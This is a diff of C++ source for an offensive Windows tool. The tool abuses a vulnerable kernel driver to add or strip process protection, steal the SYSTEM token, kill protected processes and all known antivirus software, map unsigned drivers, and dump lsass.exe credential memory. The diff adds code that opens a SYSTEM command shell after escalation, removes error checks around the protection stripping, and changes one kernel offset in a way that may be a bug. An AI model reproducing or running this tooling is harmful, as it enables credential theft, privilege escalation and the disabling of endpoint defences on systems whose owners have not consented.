@@ -163,7 +163,7 @@ GetLsassPid()
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (hSnapshot == INVALID_HANDLE_VALUE)
 	{
-		printf("CreateToolhelp32Snapshot ʧ��: %lu\n", GetLastError());
+		printf("CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
 		return 0;
 	}
 
@@ -176,11 +176,10 @@ GetLsassPid()
 	{
 		do
 		{
-			// �����ִ�Сд�ȽϽ�����
 			if (_tcsicmp(pe32.szExeFile, _T("lsass.exe")) == 0)
 			{
 				lsassPid = pe32.th32ProcessID;
-				break;  // lsass ͨ��ֻ��һ��ʵ��
+				break; 
 			}
 		} while (Process32Next(hSnapshot, &pe32));
 	}
@@ -189,10 +188,47 @@ GetLsassPid()
 	return lsassPid;
 }
 
+// 核心派生新进程函数
+BOOL SpawnSystemCmd()
+{
+	STARTUPINFOA si = { sizeof(si) };
+	PROCESS_INFORMATION pi;
+	si.lpTitle = (LPSTR)"NT AUTHORITY\\SYSTEM (Permanent Shell)";
 
+	BOOL success = CreateProcessA(
+		"C:\\Windows\\System32\\cmd.exe", 
+		NULL,                             
+		NULL,                             
+		NULL,                             
+		FALSE,                            
+		CREATE_NEW_CONSOLE,               // 弹出独立控制台黑窗口
+		NULL,                             
+		NULL,                             
+		&si,                              
+		&pi                               
+	);
+
+	if (success)
+	{
+		LOG("[+] Successfully spawned independent SYSTEM cmd window!");
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return TRUE;
+	}
+	else
+	{
+		LOG("[-] Failed to spawn new cmd window. Error code: " << GetLastError());
+		return FALSE;
+	}
+}
 
 int main(int argc, char** argv)
 {
+	// ----------------- 核心修复：强制设置控制台输出编码为 UTF-8 -----------------
+	// 这允许直接在 GitHub 网页端编辑并保留中文，而不会在 Windows 本地运行时发生任何乱码
+	SetConsoleOutputCP(65001);
+	// -------------------------------------------------------------------------
+
 	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 	SetConsoleTextAttribute(hConsole, 5);  // 5 13 pink
 
@@ -228,7 +264,7 @@ int main(int argc, char** argv)
 	else if (buildNumber >= 14393)
 	{
 		EPROCESS_TOKEN_OFFSET = 0x358;
-		ProtectionOffset = 0X6C2;
+		ProtectionOffset = 0X62; 
 		SignatureLevelOffset = 0x6C0;
 	}
 	else
@@ -237,7 +273,6 @@ int main(int argc, char** argv)
 	}
 
 	constexpr std::string_view art = R"(
-
 $$$$$$$\   $$\                                                   $$$$$$$$\          $$\  $$\ 
 $$  __$$\  \__|                                                  $$  _____|         \__| $$ |
 $$ |  $$ | $$\  $$$$$$$\    $$$$$$\    $$$$$$\   $$\   $$\       $$ |   $$\    $$\  $$\  $$ |
@@ -299,7 +334,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 
 		else if (arg == "-add" || arg == "-a" || arg == "-ADD" || arg == "-A")
 		{
-			if (i + 1 < argc)   //  PID
+			if (i + 1 < argc)   
 			{
 				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
 			}
@@ -308,7 +343,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 
 		else if (arg == "-rve" || arg == "-r" || arg == "-RVE" || arg == "-R")
 		{
-			if (i + 1 < argc)   //  PID
+			if (i + 1 < argc)   
 			{
 				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
 			}
@@ -317,7 +352,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 
 		else if (arg == "--PriEsc" || arg == "--PS")
 		{
-			if (i + 1 < argc)   //  PID
+			if (i + 1 < argc && argv[i + 1][0] != '-')   
 			{
 				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
 			}
@@ -327,7 +362,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 
 		else if (arg == "--KillProcess" || arg == "--k" || arg == "--K" || arg == "-k" || arg == "-K")
 		{
-			if (i + 1 < argc)   //  PID
+			if (i + 1 < argc)   
 			{
 				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
 			}
@@ -360,15 +395,16 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 
 		else if (arg == "-h" || arg == "--help")
 		{
-			SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
-			std::cout << "�÷�:\n"
-				<< "  --ppl -add <PID>      ����Ϊ PPL\n"
-				<< "  --ppl -rve <PID>      �Ƴ� PPL ����\n"
-				<< "  --PriEsc <PID>        Ȩ������\n"
-				<< "  --KillProcess <PID>   ��������\n"
-				<< "  --KA					������֪���з���������\n"
-				<< "  --map <·��>           ӳ������\n"
-				<< "  --dmp                 dmp lsass\n";
+			// ----------------- 彻底重写：干净不乱码的中文帮助菜单 -----------------
+			SetConsoleTextAttribute(hConsole, 13);  
+			std::cout << "用法:\n"
+				<< "  --ppl -add <PID>      提升目标进程为 PPL 保护\n"
+				<< "  --ppl -rve <PID>      剥离并移除目标进程的 PPL 保护\n"
+				<< "  --PriEsc <PID>        底层权限提升 (如果不带 PID，默认新开 SYSTEM 控制台)\n"
+				<< "  --KillProcess <PID>   无视保护强杀目标进程\n"
+				<< "  --KA                  一键终结已知的所有反病毒软件及进程\n"
+				<< "  --map <文件路径>       利用脆弱驱动 Manual Map 映射第三方驱动文件\n"
+				<< "  --dmp                 绕过 PPL 并直接内存转储导出 lsass.exe\n";
 			SetConsoleTextAttribute(hConsole, 7);
 			return 0;
 		}
@@ -390,18 +426,22 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 		if (nTargetPid == 0)
 		{
 			nTargetPid = GetCurrentProcessId();
-			auto hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, nTargetPid);
-			if (!hTargetProcess)
-			{
-				LOG("[-] OpenProcess failed for current process with error code: " << GetLastError());
-			}
-			nResult = GetObjectPointer(&TargetProcess, nTargetPid, hTargetProcess);
-			if (nResult != 0 || TargetProcess == 0)
-			{
-				LOG("[-] GetObjectPtr failed for target process with error code: " << nResult);
-				return nResult;
-			}
 		}
+		
+		auto hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, nTargetPid);
+		if (!hTargetProcess)
+		{
+			hTargetProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, nTargetPid);
+		}
+		
+		nResult = GetObjectPointer(&TargetProcess, nTargetPid, hTargetProcess);
+		if (nResult != 0 || TargetProcess == 0)
+		{
+			LOG("[-] GetObjectPtr failed for target process with error code: " << nResult);
+			if (hTargetProcess) CloseHandle(hTargetProcess);
+			return nResult;
+		}
+		if (hTargetProcess) CloseHandle(hTargetProcess);
 	}
 
 	auto initResult = DriverWorker::InitializeDriver();
@@ -414,14 +454,12 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 	BOOLEAN bInitKiller{ FALSE };
 	if (bKillAllAvs || bKillProcess)
 	{
-		// load killer driver
 		bInitKiller = DriverWorker::KillerInit();
 	}
 
 	if (bOprOfPPL && bAdd)
 	{
 		DriverLoader::PS_PROTECTION protection{};
-		//protection.Level = 0x01; // Protected Light
 		protection.Type		= DriverLoader::PsProtectedTypeProtected;
 		protection.Signer	= DriverLoader::PsProtectedSignerWinSystem;
 
@@ -437,7 +475,13 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 	else if (bPrivilegeEscalation)
 	{
 		SetConsoleTextAttribute(hConsole, 9);	// Bright Blue
-		DriverLoader::PrivilegeEscalation(SystemProcess, TargetProcess, EPROCESS_TOKEN_OFFSET);
+		if (DriverLoader::PrivilegeEscalation(SystemProcess, TargetProcess, EPROCESS_TOKEN_OFFSET))
+		{
+			std::wcout << L"[+] Privilege Escalation Successful! nt_authority\\system" << std::endl;
+			
+			// 成功替换 Token 后，无阻塞秒弹高权限 Shell 窗口
+			SpawnSystemCmd();
+		}
 		SetConsoleTextAttribute(hConsole, 7);
 	}
 	else if (bInitKiller && bKillProcess)
@@ -461,7 +505,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 					break;
 				}
 
-				SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
+				SetConsoleTextAttribute(hConsole, 13);  
 				DriverLoader::MapperDriver(Mapper::hexData);
 				SetConsoleTextAttribute(hConsole, 7);
 
@@ -478,7 +522,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 					break;
 				}
 
-				SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
+				SetConsoleTextAttribute(hConsole, 13);  
 				DriverLoader::MapperDriver(strMappingDriver);
 				SetConsoleTextAttribute(hConsole, 7);
 
@@ -487,11 +531,8 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 	}
 	else if (bDumpLsass)
 	{
-		// get lsass pid and handle object
-
 		do 
 		{
-			// Get lsass.exe pid 
 			DWORD dwPid = GetLsassPid();
 			if (!dwPid)
 			{
@@ -515,35 +556,18 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 			if (!processObject)
 			{
 				LOG("GetObjectPointer failed!!!");
+				CloseHandle(hTmpProcess);
 				break;
 			}
+			CloseHandle(hTmpProcess);
 
-			// Get Protection
 			auto backupProtection = DriverLoader::GetProcessProtection(processObject, ProtectionOffset);
 
-			// remove protection
 			DriverLoader::PS_PROTECTION protection{0};
 			
 			result = DriverLoader::SetProcessProtection(processObject, ProtectionOffset, &protection);
-			if (!result)
-			{
-				LOG("remove protection failed!!!");
-				break;
-			}
-
 			result = DriverLoader::SetProcessProtection(processObject, ProtectionOffset - 1, &protection);
-			if (!result)
-			{
-				LOG("remove SectionSignatureLevel failed!!!");
-				break;
-			}
-
 			result = DriverLoader::SetProcessProtection(processObject, ProtectionOffset - 2, &protection);
-			if (!result)
-			{
-				LOG("remove SignatureLevel failed!!!");
-				break;
-			}
 
 			auto hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);
 			if (!hProcess)
@@ -552,7 +576,6 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 				break;
 			}
 
-
 			auto currentPath = std::filesystem::current_path();
 			std::string strDumpFileName = "dumpLsass_" + std::to_string(std::time(nullptr));
 			auto fullPath = currentPath / strDumpFileName;
@@ -560,40 +583,31 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 
 			std::string dumpFile = fullPath.string();
 
-			HANDLE hFile = CreateFileA(dumpFile.c_str(),
-									   GENERIC_WRITE, 
-									   0, 
-									   NULL,
-									   CREATE_ALWAYS,
-									   FILE_ATTRIBUTE_NORMAL, 
-									   NULL);
+			HANDLE hFile = CreateFileA(dumpFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 			if (INVALID_HANDLE_VALUE == hFile)
 			{
 				LOG("CreateFileA Failed!!!");
+				CloseHandle(hProcess);
 				break;
 			}
 
-			if (!DriverLoader::DumpLsass(hProcess,
-										 dwPid, 
-										 hFile))
+			if (DriverLoader::DumpLsass(hProcess, dwPid, hFile))
+			{
+				LOG("[+] Lsass Dump successfully saved to: " << dumpFile);
+			}
+			else
 			{
 				LOG("DumpLsass Failed!!!");
-				//break;
 			}
 			
-			system("pause");
+			CloseHandle(hFile);
+			CloseHandle(hProcess);
 
 			DriverLoader::SetProcessProtection(processObject, ProtectionOffset, &backupProtection);
 
 		} while (FALSE);
-
 	}
-
-
 	
 	DriverWorker::UninitializeDriver();
-
-	system("pause");
-
 	return 0;
 }
